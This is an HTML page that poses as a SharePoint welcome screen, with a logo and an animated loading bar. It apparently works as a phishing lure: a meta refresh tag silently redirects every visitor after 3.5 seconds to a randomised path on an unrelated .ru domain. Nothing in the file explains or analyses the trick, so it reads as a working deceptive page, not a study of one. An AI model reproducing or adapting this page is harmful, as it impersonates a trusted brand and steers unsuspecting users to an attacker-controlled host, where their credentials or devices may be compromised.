<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="3.5;url=https://QDU.osticion.ru/2aEuU/">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Welcome to SharePoint</title>
<style>
    body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        background-color: #0072C6; /* SharePoint green */
        color: white;
        font-family: Arial, sans-serif;
    }
    .content {
        text-align: center;
    }
    .loading-bar {
        width: 100px;
        height: 10px;
        background-color: white;
        margin: 20px auto;
        position: relative;
        animation: loading 3s linear forwards;
    }
    @keyframes loading {
        0% {
            width: 0;
        }
        100% {
            width: 100%;
        }
    }
</style>
</head>
<body>
    <div class="content">
        <h1>Warm welcome to SharePoint</h1>
        <img src="https://handsontek.net/images/SharePoint/WhatsNew/hero.png" alt="SharePoint Logo">
        <div class="loading-bar"></div>
    </div>
</body>
</html>
